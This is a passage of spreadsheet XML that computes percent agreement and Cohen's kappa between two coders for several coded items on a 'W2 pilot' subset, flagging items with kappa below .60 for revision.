))/E7)+(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$I$2:$I$224=1))/E7))*(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$I$2:$I$224=1))/E7))))))</f>
        <v/>
      </c>
      <c r="H7" s="2">
        <f>IF(D7="","",IF(D7&lt;0.6,"Revise wording (κ &lt; .60)","OK"))</f>
        <v/>
      </c>
    </row>
    <row r="8">
      <c r="A8" s="2" t="inlineStr">
        <is>
          <t>D6</t>
        </is>
      </c>
      <c r="B8" s="2">
        <f>SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="C8" s="15">
        <f>IF(B8=0,"",SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$J$2:$J$224=Coder2!$J$2:$J$224))/B8)</f>
        <v/>
      </c>
      <c r="D8" s="15">
        <f>IF(B8=0,"",IF(((SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$J$2:$J$224=1))/B8)*(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$J$2:$J$224=1))/B8)+(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$J$2:$J$224=1))/B8))*(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$J$2:$J$224=1))/B8)))=1,1,(C8-((SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$J$2:$J$224=1))/B8)*(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$J$2:$J$224=1))/B8)+(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$J$2:$J$224=1))/B8))*(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$J$2:$J$224=1))/B8))))/(1-((SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$J$2:$J$224=1))/B8)*(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$J$2:$J$224=1))/B8)+(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$J$2:$J$224=1))/B8))*(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$J$2:$J$224=1))/B8))))))</f>
        <v/>
      </c>
      <c r="E8" s="2">
        <f>SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="F8" s="15">
        <f>IF(E8=0,"",SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$J$2:$J$224=Coder2!$J$2:$J$224))/E8)</f>
        <v/>
      </c>
      <c r="G8" s="15">
        <f>IF(E8=0,"",IF(((SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$J$2:$J$224=1))/E8)*(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$J$2:$J$224=1))/E8)+(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$J$2:$J$224=1))/E8))*(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$J$2:$J$224=1))/E8)))=1,1,(F8-((SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$J$2:$J$224=1))/E8)*(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$J$2:$J$224=1))/E8)+(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$J$2:$J$224=1))/E8))*(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$J$2:$J$224=1))/E8))))/(1-((SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$J$2:$J$224=1))/E8)*(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$J$2:$J$224=1))/E8)+(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$J$2:$J$224=1))/E8))*(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$J$2:$J$224=1))/E8))))))</f>
        <v/>
      </c>
      <c r="H8" s="2">
        <f>IF(D8="","",IF(D8&lt;0.6,"Revise wording (κ &lt; .60)","OK"))</f>
        <v/>
      </c>
    </row>
    <row r="9">
      <c r="A9" s="2" t="inlineStr">
        <is>
          <t>D7</t>
        </is>
      </c>
      <c r="B9" s="2">
        <f>SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="C9" s="15">
        <f>IF(B9=0,"",SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$K$2:$K$224=Coder2!$K$2:$K$224))/B9)</f>
        <v/>
      </c>
      <c r="D9" s="15">
        <f>IF(B9=0,"",IF(((SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$K$2:$K$224=1))/B9)*(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$K$2:$K$224=1))/B9)+(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$K$2:$K$224=1))/B9))*(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$K$2:$K$224=1))/B9)))=1,1,(C9-((SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$K$2:$K$224=1))/B9)*(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$K$2:$K$224=1))/B9)+(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$K$2:$K$224=1))/B9))*(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$K$2:$K$224=1))/B9))))/(1-((SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$K$2:$K$224=1))/B9)*(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$K$2:$K$224=1))/B9)+(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$K$2:$K$224=1))/B9))*(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$K$2:$K$224=1))/B9))))))</f>
        <v/>
      </c>
      <c r="E9" s="2">
        <f>SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="F9" s="15">
        <f>IF(E9=0,"",SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$K$2:$K$224=Coder2!$K$2:$K$224))/E9)</f>
        <v/>
      </c>
      <c r="G9" s="15">
        <f>IF(E9=0,"",IF(((SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$K$2:$K$224=1))/E9)*(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$K$2:$K$224=1))/E9)+(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$K$2:$K$224=1))/E9))*(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$K$2:$K$224=1))/E9)))=1,1,(F9-((SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$K$2:$K$224=1))/E9)*(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$K$2:$K$224=1))/E9)+(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$K$2:$K$224=1))/E9))*(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$K$2:$K$224=1))/E9))))/(1-((SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$K$2:$K$224=1))/E9)*(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$K$2:$K$224=1))/E9)+(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$K$2:$K$224=1))/E9))*(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$K$2:$K$224=1))/E9))))))</f>
        <v/>
      </c>
      <c r="H9" s="2">
        <f>IF(D9="","",IF(D9&lt;0.6,"Revise wording (κ &lt; .60)","OK"))</f>
        <v/>
      </c>
    </row>
    <row r="10">
      <c r="A10" s="2" t="inlineStr">
        <is>
          <t>D8</t>
        </is>
      </c>
      <c r="B10" s="2">
        <f>SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="C10" s="15">
        <f>IF(B10=0,"",SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$L$2:$L$224=Coder2!$L$2:$L$224))/B10)</f>
        <v/>
      </c>
      <c r="D10" s="15">
        <f>IF(B10=0,"",IF(((SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$L$2:$L$224=1))/B10)*(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$L$2:$L$224=1))/B10)+(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$L$2:$L$224=1))/B10))*(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$L$2:$L$224=1))/B10)))=1,1,(C10-((SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$L$2:$L$224=1))/B10)*(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$L$2:$L$224=1))/B10)+(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$L$2:$L$224=1))/B10))*(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$L$2:$L$224=1))/B10))))/(1-((SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$L$2:$L$224=1))/B10)*(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$L$2:$L$224=1))/B10)+(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$L$2:$L$224=1))/B10))*(1-(SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$L$2:$L$224=1))/B10))))))</f>
        <v/>
      </c>
      <c r="E10" s="2">
        <f>SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="F10" s="15">
        <f>IF(E10=0,"",SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$L$2:$L$224=Coder2!$L$2:$L$224))/E10)</f>
        <v/>
      </c>
      <c r="G10" s="15">
        <f>IF(E10=0,"",IF(((SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$L$2:$L$224=1))/E10)*(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$L$2:$L$224=1))/E10)+(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$L$2:$L$224=1))/E10))*(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$L$2:$L$224=1))/E10)))=1,1,(F10-((SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$L$2:$L$224=1))/E10)*(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$L$2:$L$224=1))/E10)+(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$L$2:$L$224=1))/E10))*(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$L$2:$L$224=1))/E10))))/(1-((SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$L$2:$L$224=1))/E10)*(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$L$2:$L$224=1))/E10)+(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$L$2:$L$224=1))/E10))*(1-(SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder2!$L$2:$L$224=1))/E10))))))</f>
        <v/>
      </c>
      <c r="H10" s="2">
        <f>IF(D10="","",IF(D10&lt;0.6,"Revise wording (κ &lt; .60)","OK"))</f>
        <v/>
      </c>
    </row>
    <row r="11">
      <c r="A11" s="2" t="inlineStr">
        <is>
          <t>Primary domain (exact agreement)</t>
        </is>
      </c>
      <c r="B11" s="2">
        <f>SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="C11" s="15">
        <f>IF(B11=0,"",SUMPRODUCT((Cases!$B$2:$B$224="W2 pilot")*(Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$M$2:$M$224=Coder2!$M$2:$M$224))/B11)</f>
        <v/>
      </c>
      <c r="D11" s="15" t="inlineStr">
        <is>
          <t>see script</t>
        </is>
      </c>
      <c r="E11" s="2">
        <f>SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="F11" s="15">
        <f>IF(E11=0,"",SUMPRODUCT((Coder1!$AN$2:$AN$224=1)*(Coder2!$AN$2:$AN$224=1)*(Coder1!$M$2:$M$224=Coder2!$M$2:$M$224))/E11)</f>
        <v/>
      </c>
      <c r="G11" s="15" t="inlineStr">
        <is>
          <t>see script</t>
        </is>
      </c>
      <c r="H11" s="2" t="n"/>
    </row>
    <row r="12">
      <c r="A12" s="2" t="n"/>
      <c r="B12" s="2" t="n"/>
      <c r="C12" s="15" t="n"/>
      <c r="D12" s="15" t="n"/>
      <c r="E12" s="2" t="n"/>
      <c r="F12" s="15" t="n"/>
      <c r="G12" s="15" t="n"/>
      <c r="H12" s="2" t="n"/>
    </row>
    <row r="13">
      <c r="A13" s="2" t="inlineStr">
        <is>
          <t>Multi-category κ for the primary domain, bootstrap CIs and control-level agreement: run python src/05_pilot_kappa.py</t>
        </is>
      </c>
      <c r="B13" s="2" t="n"/>
      <c r="C13" s="15" t="n"/>
      <c r="D13" s="15" t="n"/>
      <c r="E13" s="2" t="n"/>
      <c r="F13" s="15" t="n"/>
      <c r="G13" s="15" t="n"/>
      <c r="H13"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2026-10-13T17:40:47Z</dcterms:created>
  <dcterms:modified xmlns:dcterms="http://purl.org/dc/terms/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="dcterms:W3CDTF">2026-10-13T17:40:48Z</dcterms:modified>
</cp:coreProperties>
</file>